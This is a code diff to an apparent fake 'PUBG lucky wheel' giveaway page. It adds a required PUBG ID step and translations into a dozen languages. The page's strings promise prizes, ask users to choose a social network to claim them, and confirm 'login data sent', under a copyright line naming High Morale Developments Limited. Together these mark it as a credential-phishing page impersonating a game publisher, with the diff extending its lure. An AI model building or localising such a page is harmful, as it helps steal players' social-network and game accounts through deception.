@@ -2108,6 +2108,12 @@
                 inset 0 0 30px rgba(42, 59, 90, 0.2);
             backdrop-filter: blur(10px);
             text-align: center;
+            display: none;
+        }
+        
+        .id-input-section.active {
+            display: block;
+            animation: slideInUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
         .id-input-section h2 {
@@ -2824,7 +2830,7 @@
         </div>
         
         <!-- Секция для ввода ID -->
-        <div class="id-input-section">
+        <div class="id-input-section" id="idInputSection">
             <h2 id="idSectionTitle">ВВЕДИТЕ ВАШ ID PUBG</h2>
             <p id="idSectionText">Введите ваш ID PUBG Mobile для получения приза</p>
             
@@ -2877,6 +2883,7 @@
         let winnersTimer = null;
         let currentLanguage = 'ru';
         let playerId = '';
+        let hasShownLanguageNotification = false; // Флаг для предотвращения уведомления при загрузке
         
         // Полные переводы для всех языков
         const translations = {
@@ -2917,7 +2924,8 @@
                 idPlaceholder: "Введите ваш ID PUBG",
                 idSubmitBtn: "ОТПРАВИТЬ",
                 idNotificationSuccess: "ID успешно сохранен!",
-                idNotificationError: "Пожалуйста, введите ваш ID PUBG"
+                idNotificationError: "Пожалуйста, введите ваш ID PUBG",
+                idRequiredNotification: "Пожалуйста, сначала введите ваш ID PUBG в форме ниже, чтобы получить приз"
             },
             en: {
                 play: "PLAY",
@@ -2956,7 +2964,8 @@
                 idPlaceholder: "Enter your PUBG ID",
                 idSubmitBtn: "SUBMIT",
                 idNotificationSuccess: "ID successfully saved!",
-                idNotificationError: "Please enter your PUBG ID"
+                idNotificationError: "Please enter your PUBG ID",
+                idRequiredNotification: "Please first enter your PUBG ID in the form below to receive the prize"
             },
             uz: {
                 play: "O'YNA",
@@ -2995,7 +3004,8 @@
                 idPlaceholder: "PUBG IDingizni kiriting",
                 idSubmitBtn: "YUBORISH",
                 idNotificationSuccess: "ID muvaffaqiyatli saqlandi!",
-                idNotificationError: "Iltimos, PUBG IDingizni kiriting"
+                idNotificationError: "Iltimos, PUBG IDingizni kiriting",
+                idRequiredNotification: "Iltimos, avval sovrinni olish uchun quyidagi formada PUBG IDingizni kiriting"
             },
             kz: {
                 play: "ОЙНАУ",
@@ -3034,7 +3044,8 @@
                 idPlaceholder: "PUBG IDіңізді енгізіңіз",
                 idSubmitBtn: "ЖІБЕРУ",
                 idNotificationSuccess: "ID сәтті сақталды!",
-                idNotificationError: "PUBG IDіңізді енгізіңіз"
+                idNotificationError: "PUBG IDіңізді енгізіңіз",
+                idRequiredNotification: "Алдымен жүлдені алу үшін төмендегі формада PUBG IDіңізді енгізіңіз"
             },
             ar: {
                 play: "لعب",
@@ -3073,7 +3084,328 @@
                 idPlaceholder: "أدخل معرف PUBG الخاص بك",
                 idSubmitBtn: "إرسال",
                 idNotificationSuccess: "تم حفظ المعرف بنجاح!",
-                idNotificationError: "الرجاء إدخال معرف PUBG الخاص بك"
+                idNotificationError: "الرجاء إدخال معرف PUBG الخاص بك",
+                idRequiredNotification: "الرجاء أولاً إدخال معرف PUBG الخاص بك في النموذج أدناه للحصول على الجائزة"
+            },
+            zh: {
+                play: "玩",
+                title: "PUBG 幸运轮盘",
+                subtitle: "试试你的运气，赢取独家奖品！",
+                selectTitle: "选择领取方式",
+                selectText: "选择社交网络领取奖品",
+                getPrizeBtn: "领取奖品",
+                notificationSuccess: "申请已接受！奖品将在24小时内到账。",
+                notificationSelectSocial: "请选择社交网络",
+                notificationAlreadyPlayed: "您今天已经使用了您的机会！",
+                confirmationTitle: "申请已接受！",
+                confirmationMessage: "您的奖金将在24小时内计入您的PUBG Mobile账户。",
+                loginSuccess: "登录数据已发送！奖品将在24小时内到账。",
+                alreadyPlayed: "已经玩过",
+                myPrize: "我的奖品",
+                importantNote: "重要：奖品将在24小时内到账",
+                confirmationThanks: "感谢参与！别忘了检查您的游戏内库存。",
+                choosePrize: "选择社交网络领取奖品",
+                developers: "开发者 Instagram",
+                support: "技术支持 Telegram",
+                yourPrize: "您的奖品",
+                prizeDescription: "物品已发送到您的游戏邮箱。请等待最多24小时处理交易。",
+                collect: "领取",
+                emptyMail: "邮箱为空",
+                emptyMailDesc: "您还没有任何奖品。玩幸运轮盘赢取独家奖品！",
+                winners: "获胜者：",
+                terms: "服务条款",
+                privacy: "隐私政策",
+                cookiePolicy: "Cookie政策",
+                cookiePref: "Cookie偏好",
+                copyright: "版权所有 © High Morale Developments Limited。保留所有权利。",
+                selected: "已选择",
+                idSectionTitle: "输入您的PUBG ID",
+                idSectionText: "输入您的PUBG Mobile ID以领取奖品",
+                idPlaceholder: "输入您的PUBG ID",
+                idSubmitBtn: "提交",
+                idNotificationSuccess: "ID保存成功！",
+                idNotificationError: "请输入您的PUBG ID",
+                idRequiredNotification: "请先在下方表格中输入您的PUBG ID以领取奖品"
+            },
+            ky: {
+                play: "ОЙНОО",
+                title: "PUBG ТАГДЫР ДОҢГОЛОГУ",
+                subtitle: "Ыйманды сынап, эксклюзивтүү сыйлыктарды утуп ал!",
+                selectTitle: "АЛУУ ЫКМАСЫН ТАНДАҢЫЗ",
+                selectText: "Сыйлыкты алуу үчүн социалдык тармакты тандаңыз",
+                getPrizeBtn: "СЫЙЛЫКТЫ АЛУУ",
+                notificationSuccess: "Өтүнүч кабыл алынды! Сыйлык 24 саат ичинде эсебиңизге которулат.",
+                notificationSelectSocial: "Сураныч, социалдык тармакты тандаңыз",
+                notificationAlreadyPlayed: "Сиз бүгүнкү мүмкүнчүлүгүңүздү колдондуңуз!",
+                confirmationTitle: "ӨТҮНҮЧ КАБЫЛ АЛЫНДЫ!",
+                confirmationMessage: "Жеңишиңиз 24 саат ичинде PUBG Mobile эсебиңизге которулат.",
+                loginSuccess: "Кирүү маалыматтары жөнөтүлдү! Сыйлык 24 саат ичинде которулат.",
+                alreadyPlayed: "АЗЫР ОЙНОЛДУ",
+                myPrize: "Менин сыйлыгым",
+                importantNote: "Маанилүү: Сыйлык 24 саат ичинде эсебиңизге которулат",
+                confirmationThanks: "Катышкан үчүн рахмат! Оюн ичиндеги инвентарьды текшерүүнү унутпаңыз.",
+                choosePrize: "Сыйлыкты алуу үчүн социалдык тармакты тандаңыз",
+                developers: "Иштеп чыгуучулар Instagram",
+                support: "Техникалык колдоо Telegram",
+                yourPrize: "СИЗДИН СЫЙЛЫГЫҢЫЗ",
+                prizeDescription: "Элемент оюн почтаңызга жөнөтүлдү. Транзакция иштетилиши үчүн 24 саатка чейин күтө туруңуз.",
+                collect: "АЛУУ",
+                emptyMail: "ПОЧТА БОШ",
+                emptyMailDesc: "Сизде азырынча эч кандай сыйлык жок. Эксклюзивтүү сыйлыктарды утуп алуу үчүн тагдыр дөңгөлөгүнө ойноңуз!",
+                winners: "Жеңүүчүлөр:",
+                terms: "Кызмат көрсөтүү шарттары",
+                privacy: "Купуялык саясаты",
+                cookiePolicy: "Cookie саясаты",
+                cookiePref: "Cookie параметрлери",
+                copyright: "Автордук укук © High Morale Developments Limited. Бардык укуктар корголгон.",
+                selected: "ТАНДАЛДЫ",
+                idSectionTitle: "PUBG IDИҢИЗДИ КИРГИЗИҢИЗ",
+                idSectionText: "Сыйлыкты алуу үчүн PUBG Mobile IDиңизди киргизиңиз",
+                idPlaceholder: "PUBG IDиңизди киргизиңиз",
+                idSubmitBtn: "ЖӨНӨТҮҮ",
+                idNotificationSuccess: "ID ийгиликтүү сакталды!",
+                idNotificationError: "PUBG IDиңизди киргизиңиз",
+                idRequiredNotification: "Алгач сыйлыкты алуу үчүн төмөнкү формада PUBG IDиңизди киргизиңиз"
+            },
+            dag: {
+                play: "ЛЕКЬИ",
+                title: "PUBG БАХТЛА КЪАЛАЙ",
+                subtitle: "Бахингни синаб, эксклюзив призлари къазан!",
+                selectTitle: "АЛГЪАН ЮСУЛНУ ТАНЛА",
+                selectText: "Приз алгъан учун социал сеткини танла",
+                getPrizeBtn: "ПРИЗНИ АЛ",
+                notificationSuccess: "Заявка къабул этилди! Приз 24 сагьат ичинде аккаунтунгъа ёллана.",
+                notificationSelectSocial: "Лутфан, социал сеткини танла",
+                notificationAlreadyPlayed: "Сен бугунгъу имкониятингни ишлетдинг!",
+                confirmationTitle: "ЗАЯВКА КЪАБУЛ ЭТИЛДИ!",
+                confirmationMessage: "Къазандынгъ 24 сагьат ичинде PUBG Mobile аккаунтунгъа ёллана.",
+                loginSuccess: "Гириш магълуматлари ёлланыбди! Приз 24 сагьат ичинде ёллана.",
+                alreadyPlayed: "ГАЛАБАРХА ЛЕКЬИНГ",
+                myPrize: "Мени призим",
+                importantNote: "Мухим: Приз 24 сагьат ичинде аккаунтунгъа ёллана",
+                confirmationThanks: "Иштирак этибген учун рагьмет! Оюн ичиндеги инвентарингни текшириб унутма.",
+                choosePrize: "Приз алгъан учун социал сеткини танла",
+                developers: "Разработчиклар Instagram",
+                support: "Техподдержка Telegram",
+                yourPrize: "СЕНИ ПРИЗИНГ",
+                prizeDescription: "Элемент оюн почтангъа ёлланыбди. Транзакция ишленмеси учун 24 сагьатгъа дегир сабыр эт.",
+                collect: "АЛ",
+                emptyMail: "ПОЧТА БОШ",
+                emptyMailDesc: "Сенде гали янгъы приз йокъ. Эксклюзив призлари къазанмагъан учун бахтла къалайда лекьи.",
+                winners: "Къазандылар:",
+                terms: "Хизмат кёрсетме шартлари",
+                privacy: "Махфийлик сиясати",
+                cookiePolicy: "Cookie сиясати",
+                cookiePref: "Cookie терчилмелери",
+                copyright: "Авторлукъ гъукукъ © High Morale Developments Limited. Бютюн гъукукълар сакъланыбди.",
+                selected: "ТАНЛАНДЫ",
+                idSectionTitle: "PUBG IDИНГИЗНИ ГИРГИЗИНГИЗ",
+                idSectionText: "Приз алгъан учун PUBG Mobile IDиңизни гиргизингиз",
+                idPlaceholder: "PUBG IDиңизни гиргизингиз",
+                idSubmitBtn: "ЁЛЛА",
+                idNotificationSuccess: "ID муваффакийетле сакъланды!",
+                idNotificationError: "Лутфан, PUBG IDиңизни гиргизингиз",
+                idRequiredNotification: "Алгач приз алгъан учун ашагъыдаги формада PUBG IDиңизни гиргизингиз"
+            },
+            che: {
+                play: "ЛОВЗА",
+                title: "PUBG БАЬРКХИЙН ГӏАРЖА",
+                subtitle: "Шина безам, эксклюзив совгӀаташ еъ!",
+                selectTitle: "ДАККХА МЕТОД ХАРЖА",
+                selectText: "СовгӀат даккха болучухьа социалан гулам харжа",
+                getPrizeBtn: "СОВҒӐТ ДАККХА",
+                notificationSuccess: "ДӀахаийтина! СовгӀат 24 сахьат чохь аккаунте ваха.",
+                notificationSelectSocial: "Дехар доьӀу, социалан гулам харжа",
+                notificationAlreadyPlayed: "ХӀинца хьуна чохь ловзар деза!",
+                confirmationTitle: "ДӀАХАИЙТИНА!",
+                confirmationMessage: "Тхоьхьам 24 сахьат чохь PUBG Mobile аккаунте ваха.",
+                loginSuccess: "Вовшахкхетта хаам дӀадаьхьина! СовгӀат 24 сахьат чохь ваха.",
+                alreadyPlayed: "ХӀИНЦА ЛОВЗИНА",
+                myPrize: "Сан совгӀат",
+                importantNote: "Боккъала: СовгӀат 24 сахьат чохь аккаунте ваха",
+                confirmationThanks: "Дакъа лаьцна баркалла! Ловза чохь хӀуманаш гучуйаккха язде.",
+                choosePrize: "СовгӀат даккха болучухьа социалан гулам харжа",
+                developers: "Кхоьлинар Instagram",
+                support: "Техподдержка Telegram",
+                yourPrize: "ХЬАН СОВҒӐТ",
+                prizeDescription: "Яздина ловза поштехь. Транзакци Ӏалашъян 24 сахьат кхача.",
+                collect: "ДАККХА",
+                emptyMail: "ПОШТА ЦАЬРЦА",
+                emptyMailDesc: "ХӀинца хьуна цхьаъ а совгӀат йац. Эксклюзив совгӀаташ еан баьркхийн гӀаржа ловза.",
+                winners: "Толамхой:",
+                terms: "Хьалхара барт",
+                privacy: "Тайпан политика",
+                cookiePolicy: "Cookie политика",
+                cookiePref: "Cookie харжам",
+                copyright: "Авторан бакъо © High Morale Developments Limited. Массо бакъонаш ларйина.",
+                selected: "ХАРЖАНА",
+                idSectionTitle: "PUBG ID ХЬУЬННА ХЬАЖА",
+                idSectionText: "СовгӀат даккха болучухьа PUBG Mobile ID хьуьнна хьажа",
+                idPlaceholder: "PUBG ID хьуьнна хьажа",
+                idSubmitBtn: "ДӀАДАХЬА",
+                idNotificationSuccess: "ID дика дӀадаьхьина!",
+                idNotificationError: "Дехар доьӀу, PUBG ID хьуьнна хьажа",
+                idRequiredNotification: "Хьалхара совгӀат даккха болучухьа оцу форма тӀехь PUBG ID хьуьнна хьажа"
+            },
+            az: {
+                play: "OYNA",
+                title: "PUBG BƏXT ÇARXI",
+                subtitle: "Bəxtini sına və eksklüziv mükafatlar qazan!",
+                selectTitle: "ALINMA ÜSULUNU SEÇ",
+                selectText: "Mükafatı almaq üçün sosial şəbəkəni seç",
+                getPrizeBtn: "MÜKAFATI AL",
+                notificationSuccess: "Müraciət qəbul edildi! Mükafat 24 saat ərzində hesabınıza köçürüləcək.",
+                notificationSelectSocial: "Xahiş edirik, sosial şəbəkəni seçin",
+                notificationAlreadyPlayed: "Siz bu günkü imkanınızdan istifadə etdiniz!",
+                confirmationTitle: "MÜRACİƏT QƏBUL EDİLDİ!",
+                confirmationMessage: "Qazancınız 24 saat ərzində PUBG Mobile hesabınıza köçürüləcək.",
+                loginSuccess: "Giriş məlumatları göndərildi! Mükafat 24 saat ərzində köçürüləcək.",
+                alreadyPlayed: "ARTIQ OYNAYIB",
+                myPrize: "Mənim mükafatım",
+                importantNote: "Əhəmiyyətli: Mükafat 24 saat ərzində hesabınıza köçürüləcək",
+                confirmationThanks: "İştirak etdiyiniz üçün təşəkkürlər! Oyun içi inventarınızı yoxlamağı unutmayın.",
+                choosePrize: "Mükafatı almaq üçün sosial şəbəkəni seç",
+                developers: "Tərtibatçılar Instagram",
+                support: "Texniki dəstək Telegram",
+                yourPrize: "SİZİN MÜKAFATINIZ",
+                prizeDescription: "Element oyun poçtunuza göndərildi. Tranzaksiyanın işlənməsi üçün 24 saata qədər gözləyin.",
+                collect: "AL",
+                emptyMail: "POÇT BOŞ",
+                emptyMailDesc: "Hələ heç bir mükafatınız yoxdur. Eksklüziv mükafatlar qazanmaq üçün bəxt çarxında oynayın!",
+                winners: "Qaliblər:",
+                terms: "Xidmət şərtləri",
+                privacy: "Məxfilik siyasəti",
+                cookiePolicy: "Cookie siyasəti",
+                cookiePref: "Cookie parametrləri",
+                copyright: "Müəllif hüququ © High Morale Developments Limited. Bütün hüquqlar qorunur.",
+                selected: "SEÇİLMİŞ",
+                idSectionTitle: "PUBG İD-NİZİ DAXİL EDİN",
+                idSectionText: "Mükafatı almaq üçün PUBG Mobile ID-nizi daxil edin",
+                idPlaceholder: "PUBG ID-nizi daxil edin",
+                idSubmitBtn: "GÖNDƏR",
+                idNotificationSuccess: "ID uğurla yadda saxlanıldı!",
+                idNotificationError: "Xahiş edirik, PUBG ID-nizi daxil edin",
+                idRequiredNotification: "Zəhmət olmasa, əvvəlcə mükafatı almaq üçün aşağıdakı formada PUBG ID-nizi daxil edin"
+            },
+            hy: {
+                play: "ԽԱՂԱԼ",
+                title: "PUBG ԲԱՅՔԻ ՊԱՏՈՒՀԱՏ",
+                subtitle: "Փորձիր քո բախտը և շահիր բացառիկ մրցանակներ!",
+                selectTitle: "ԸՆՏՐԻՐ ՍՏԱՆԱԼՈՒ ԵՆԹԱԿԱ",
+                selectText: "Մրցանակը ստանալու համար ընտրիր սոցիալական ցանց",
+                getPrizeBtn: "ՍՏԱՆԱԼ ՄՐՑԱՆԱԿ",
+                notificationSuccess: "Դիմումն ընդունվել է! Մրցանակը կմուտքագրվի 24 ժամվա ընթացքում։",
+                notificationSelectSocial: "Խնդրում ենք, ընտրեք սոցիալական ցանց",
+                notificationAlreadyPlayed: "Դուք արդեն օգտագործել եք ձեր հնարավորությունը այսօր!",
+                confirmationTitle: "ԴԻՄՈՒՄԸ ԸՆԴՈՒՆՎԵԼ Է!",
+                confirmationMessage: "Ձեր շահումը կմուտքագրվի ձեր PUBG Mobile հաշվին 24 ժամվա ընթացքում։",
+                loginSuccess: "Մուտքի տվյալները ուղարկվել են! Մրցանակը կմուտքագրվի 24 ժամվա ընթացքում։",
+                alreadyPlayed: "ԱՐԴԵՆ ԽԱՂԱԾ",
+                myPrize: "Իմ մրցանակը",
+                importantNote: "Կարևոր. Մրցանակը կմուտքագրվի ձեր հաշվին 24 ժամվա ընթացքում",
+                confirmationThanks: "Շնորհակալություն մասնակցության համար! Մի մոռացեք ստուգել ձեր խաղի ներսի գույքագրվածքը։",
+                choosePrize: "Մրցանակը ստանալու համար ընտրիր սոցիալական ցանց",
+                developers: "Մշակողներ Instagram",
+                support: "Տեխնիկական աջակցություն Telegram",
+                yourPrize: "ՁԵՐ ՄՐՑԱՆԱԿԸ",
+                prizeDescription: "Տարրը ուղարկվել է ձեր խաղային փոստ։ Խնդրում ենք սպասել մինչև 24 ժամ գործարքի մշակման համար։",
+                collect: "ՍՏԱՆԱԼ",
+                emptyMail: "ՓՈՍՏԸ ԴԱՏԱՐԿ Է",
+                emptyMailDesc: "Դուք դեռ չունեք որևէ մրցանակ։ Խաղացեք բախտի պատուհատով բացառիկ մրցանակներ շահելու համար!",
+                winners: "Հաղթողներ.",
+                terms: "Ծառայության պայմաններ",
+                privacy: "Գաղտնիության քաղաքականություն",
+                cookiePolicy: "Cookie քաղաքականություն",
+                cookiePref: "Cookie նախապատվություններ",
+                copyright: "Հեղինակային իրավունք © High Morale Developments Limited: Բոլոր իրավունքները պաշտպանված են։",
+                selected: "ԸՆՏՐՎԱԾ",
+                idSectionTitle: "ՄՈՒՏՔԱԳՐԵՔ ՁԵՐ PUBG ID-ն",
+                idSectionText: "Մրցանակը ստանալու համար մուտքագրեք ձեր PUBG Mobile ID-ն",
+                idPlaceholder: "Մուտքագրեք ձեր PUBG ID-ն",
+                idSubmitBtn: "ՈՒՂԱՐԿԵԼ",
+                idNotificationSuccess: "ID-ն հաջողությամբ պահպանվել է!",
+                idNotificationError: "Խնդրում ենք, մուտքագրեք ձեր PUBG ID-ն",
+                idRequiredNotification: "Խնդրում ենք, նախ մուտքագրեք ձեր PUBG ID-ն ստորև բերված ձևում մրցանակը ստանալու համար"
+            },
+            jp: {
+                play: "プレイ",
+                title: "PUBG 幸運の輪",
+                subtitle: "運を試して限定アイテムをゲットしよう！",
+                selectTitle: "受け取り方法を選択",
+                selectText: "賞品を受け取るためのソーシャルネットワークを選択してください",
+                getPrizeBtn: "賞品を受け取る",
+                notificationSuccess: "申請が受け付けられました！賞品は24時間以内に付与されます。",
+                notificationSelectSocial: "ソーシャルネットワークを選択してください",
+                notificationAlreadyPlayed: "本日は既に挑戦済みです！",
+                confirmationTitle: "申請が受け付けられました！",
+                confirmationMessage: "賞品は24時間以内にPUBG Mobileアカウントに付与されます。",
+                loginSuccess: "ログインデータが送信されました！賞品は24時間以内に付与されます。",
+                alreadyPlayed: "既にプレイ済み",
+                myPrize: "マイプライズ",
+                importantNote: "重要：賞品は24時間以内にアカウントに付与されます",
+                confirmationThanks: "ご参加ありがとうございます！ゲーム内のインベントリを確認するのをお忘れなく。",
+                choosePrize: "賞品を受け取るためのソーシャルネットワークを選択してください",
+                developers: "開発者 Instagram",
+                support: "テクニカルサポート Telegram",
+                yourPrize: "あなたの賞品",
+                prizeDescription: "アイテムがゲーム内メールに送信されました。取引処理のため最大24時間お待ちください。",
+                collect: "受け取る",
+                emptyMail: "メールが空です",
+                emptyMailDesc: "まだ賞品がありません。幸運の輪を回して限定アイテムを獲得しましょう！",
+                winners: "当選者：",
+                terms: "利用規約",
+                privacy: "プライバシーポリシー",
+                cookiePolicy: "クッキーポリシー",
+                cookiePref: "クッキー設定",
+                copyright: "著作権 © High Morale Developments Limited。全著作権所有。",
+                selected: "選択済み",
+                idSectionTitle: "PUBG IDを入力",
+                idSectionText: "賞品を受け取るためPUBG Mobile IDを入力してください",
+                idPlaceholder: "PUBG IDを入力してください",
+                idSubmitBtn: "送信",
+                idNotificationSuccess: "IDが正常に保存されました！",
+                idNotificationError: "PUBG IDを入力してください",
+                idRequiredNotification: "まずは下のフォームにPUBG IDを入力して賞品を受け取ってください"
+            },
+            uk: {
+                play: "ГРАТИ",
+                title: "PUBG КОЛЕСО ФОРТУНИ",
+                subtitle: "Спробуй удачу та виграй ексклюзивні призи!",
+                selectTitle: "ОБЕРІТЬ СПОСІБ ОТРИМАННЯ",
+                selectText: "Виберіть соціальну мережу для отримання призу",
+                getPrizeBtn: "ОТРИМАТИ ПРИЗ",
+                notificationSuccess: "Заявку прийнято! Приз буде зараховано протягом 24 годин.",
+                notificationSelectSocial: "Будь ласка, виберіть соціальну мережу",
+                notificationAlreadyPlayed: "Ви вже використали свою спробу сьогодні!",
+                confirmationTitle: "ЗАЯВКУ ПРИЙНЯТО!",
+                confirmationMessage: "Ваш виграш буде зараховано на акаунт PUBG Mobile протягом 24 годин.",
+                loginSuccess: "Дані для входу відправлено! Приз буде зараховано протягом 24 годин.",
+                alreadyPlayed: "ВЖЕ ГРАЛИ",
+                myPrize: "Мій приз",
+                importantNote: "Важливо: Приз буде зараховано на ваш акаунт протягом 24 годин",
+                confirmationThanks: "Дякуємо за участь! Не забудьте перевірити свій ігровий інвентар.",
+                choosePrize: "Виберіть соціальну мережу для отримання призу",
+                developers: "Розробники Instagram",
+                support: "Техпідтримка Telegram",
+                yourPrize: "ВАШ ПРИЗ",
+                prizeDescription: "Предмет було відправлено на вашу ігрову пошту. Будь ласка, зачекайте до 24 годин для обробки транзакції.",
+                collect: "ЗАБРАТИ",
+                emptyMail: "ПОШТА ПОРОЖНЯ",
+                emptyMailDesc: "У вас поки що немає виграних призів. Зіграйте у колесо фортуни, щоб виграти ексклюзивні призи!",
+                winners: "Переможців:",
+                terms: "Умови обслуговування",
+                privacy: "Політика конфіденційності",
+                cookiePolicy: "Політика Cookie",
+                cookiePref: "Налаштування Cookie",
+                copyright: "Авторські права © High Morale Developments Limited. Усі права захищені.",
+                selected: "ОБРАНО",
+                idSectionTitle: "ВВЕДІТЬ ВАШ ID PUBG",
+                idSectionText: "Введіть ваш ID PUBG Mobile для отримання призу",
+                idPlaceholder: "Введіть ваш ID PUBG",
+                idSubmitBtn: "НАДІСЛАТИ",
+                idNotificationSuccess: "ID успішно збережено!",
+                idNotificationError: "Будь ласка, введіть ваш ID PUBG",
+                idRequiredNotification: "Будь ласка, спочатку введіть ваш ID PUBG у формі нижче, щоб отримати приз"
             }
         };
         
@@ -3169,7 +3501,11 @@
             // Сохраняем язык в localStorage
             localStorage.setItem('preferredLanguage', lang);
             
-            showNotification(`${lang === 'en' ? 'Language changed to' : 'Язык изменен на'} ${langNames[lang] || 'Русский'}`);
+            // Показываем уведомление только если это не первая загрузка
+            if (hasShownLanguageNotification) {
+                showNotification(`${lang === 'en' ? 'Language changed to' : 'Язык изменен на'} ${langNames[lang] || 'Русский'}`);
+            }
+            hasShownLanguageNotification = true;
         }
         
         // Функция для окна приза
@@ -3397,6 +3733,7 @@
             const savedLanguage = localStorage.getItem('preferredLanguage');
             if (savedLanguage && translations[savedLanguage]) {
                 currentLanguage = savedLanguage;
+                hasShownLanguageNotification = true; // Устанавливаем флаг, чтобы не показывать уведомление
             }
             
             // Загружаем сохраненный ID игрока
@@ -3458,6 +3795,7 @@
             // Элементы для ID
             const playerIdInput = document.getElementById('playerIdInput');
             const idSubmitBtn = document.getElementById('idSubmitBtn');
+            const idInputSection = document.getElementById('idInputSection');
             
             // Призы с картинками
             const prizes = [
@@ -3511,6 +3849,9 @@
                 
                 const t = translations[currentLanguage] || translations.ru;
                 showNotification(t.idNotificationSuccess, false, true);
+                
+                // Скрываем секцию ID после успешного ввода
+                idInputSection.classList.remove('active');
             });
             
             // Также сохраняем ID при нажатии Enter
@@ -3568,6 +3909,7 @@
                 playBtn.disabled = true;
                 socialSelectSection.classList.remove('active');
                 confirmationSection.classList.remove('active');
+                idInputSection.classList.remove('active');
                 showSelectionIndicator(false);
                 
                 finalPrizeIndex = getRandomPrize();
@@ -3638,12 +3980,20 @@
                             socialOptions.forEach(opt => opt.classList.remove('selected'));
                             selectedSocial = null;
                             
-                            // Показываем форму выбора соцсети
-                            socialSelectSection.classList.add('active');
-                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
-                            
-                            const t = translations[currentLanguage] || translations.ru;
-                            showNotification(t.notificationSuccess, false, true);
+                            // Проверяем, есть ли у пользователя ID
+                            if (!playerId) {
+                                // Если ID нет, показываем форму для ввода ID
+                                idInputSection.classList.add('active');
+                                idInputSection.scrollIntoView({ behavior: 'smooth' });
+                                const t = translations[currentLanguage] || translations.ru;
+                                showNotification(t.idRequiredNotification, false, false);
+                            } else {
+                                // Если ID уже есть, показываем форму выбора соцсети
+                                socialSelectSection.classList.add('active');
+                                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                                const t = translations[currentLanguage] || translations.ru;
+                                showNotification(t.notificationSuccess, false, true);
+                            }
                         }, 1000);
                     }, 300);
                 }
@@ -3652,6 +4002,13 @@
             // Обработчики выбора соцсети
             socialOptions.forEach(option => {
                 option.addEventListener('click', function() {
+                    // Проверяем, есть ли у пользователя ID
+                    if (!playerId) {
+                        const t = translations[currentLanguage] || translations.ru;
+                        showNotification(t.idRequiredNotification, true);
+                        return;
+                    }
+                    
                     socialOptions.forEach(opt => opt.classList.remove('selected'));
                     
                     this.classList.add('selected');
@@ -3812,6 +4169,13 @@
                 if (!selectedSocial) {
                     const t = translations[currentLanguage] || translations.ru;
                     showNotification(t.notificationSelectSocial, true);
+                    return;
+                }
+                
+                // Проверяем, есть ли у пользователя ID
+                if (!playerId) {
+                    const t = translations[currentLanguage] || translations.ru;
+                    showNotification(t.idRequiredNotification, true);
                     return;
                 }
                 
